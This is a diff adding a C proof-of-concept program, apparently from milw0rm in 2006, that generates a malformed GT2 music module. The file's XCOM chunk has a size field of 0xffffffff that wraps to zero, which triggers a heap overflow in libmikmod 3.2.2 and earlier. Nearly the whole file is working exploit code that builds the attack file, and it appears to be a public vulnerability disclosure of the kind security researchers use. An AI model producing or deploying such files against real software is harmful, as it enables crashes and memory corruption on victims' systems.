@@ -1,0 +1,151 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+
+
+#define VER         "0.1"
+
+
+
+#define cpy(x,y)    strncpy(x, y, sizeof(x));
+void fwi08(FILE *fd, int num);
+void fwi16(FILE *fd, int num);
+void fwi32(FILE *fd, int num);
+void fwstr(FILE *fd, uint8_t *str);
+void fwmem(FILE *fd, uint8_t *data, int size);
+void std_err(void);
+
+
+
+#pragma pack(1)
+
+typedef struct {
+    uint8_t     gt2[3];
+    uint8_t     version;
+    uint32_t    chunk_size;
+    uint8_t     module[32];
+    uint8_t     comments[160];
+    uint8_t     date_day;
+    uint8_t     date_month;
+    uint16_t    date_year;
+    uint8_t     tracker[24];
+    uint16_t    speed;
+    uint16_t    tempo;
+    uint16_t    volume;
+    uint16_t    voices;
+    /* voices * 2 */
+} gt2_t;
+
+#pragma pack()
+
+
+
+int main(int argc, char *argv[]) {
+    FILE    *fd;
+    gt2_t   gt2;
+    int     i;
+    char    *fname;
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "libmikmod <= 3.2.2 and current CVS heap overflow with GT2 files "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    aluigi.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s <output_file.GT2>\n"
+            "\n", argv[0]);
+        exit(1);
+    }
+
+    fname = argv[1];
+
+    printf("- create file %s\n", fname);
+    fd = fopen(fname, "wb");
+    if(!fd) std_err();
+
+    gt2.gt2[0]        = 'G';
+    gt2.gt2[1]        = 'T';
+    gt2.gt2[2]        = '2';
+    gt2.version       = 4;
+    gt2.chunk_size    = 0;                  // unused
+    cpy(gt2.module,   "module_name");
+    cpy(gt2.comments, "author");
+    gt2.date_day      = 1;
+    gt2.date_month    = 1;
+    gt2.date_year     = 2006;
+    cpy(gt2.tracker,  "tracker");
+    gt2.speed         = 6;
+    gt2.tempo         = 300;
+    gt2.volume        = 0;
+    gt2.voices        = 0;
+
+    printf("- write GT2 header\n");
+    fwrite(&gt2, sizeof(gt2), 1, fd);
+    for(i = 0; i < gt2.voices; i++) fwi16(fd, 0);
+
+    printf("- build the XCOM header for exploiting the heap overflow\n");
+    fwmem(fd, "XCOM", 4);
+    fwi32(fd, 0);                           // unused
+    fwi32(fd, 0xffffffff);                  // bug here, 0xffffffff + 1 = 0
+    fwstr(fd, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
+
+    fclose(fd);
+    printf("- finished\n");
+    return(0);
+}
+
+
+
+void fwi08(FILE *fd, int num) {
+    fputc((num      ) & 0xff, fd);
+}
+
+
+
+void fwi16(FILE *fd, int num) {
+    fputc((num      ) & 0xff, fd);
+    fputc((num >>  8) & 0xff, fd);
+}
+
+
+
+void fwi32(FILE *fd, int num) {
+    fputc((num      ) & 0xff, fd);
+    fputc((num >>  8) & 0xff, fd);
+    fputc((num >> 16) & 0xff, fd);
+    fputc((num >> 24) & 0xff, fd);
+}
+
+
+
+void fwstr(FILE *fd, uint8_t *str) {
+    fputs(str, fd);
+}
+
+
+
+void fwmem(FILE *fd, uint8_t *data, int size) {
+    fwrite(data, size, 1, fd);
+}
+
+
+
+void std_err(void) {
+    perror("\nError");
+    exit(1);
+}
+
+// milw0rm.com [2006-07-25]
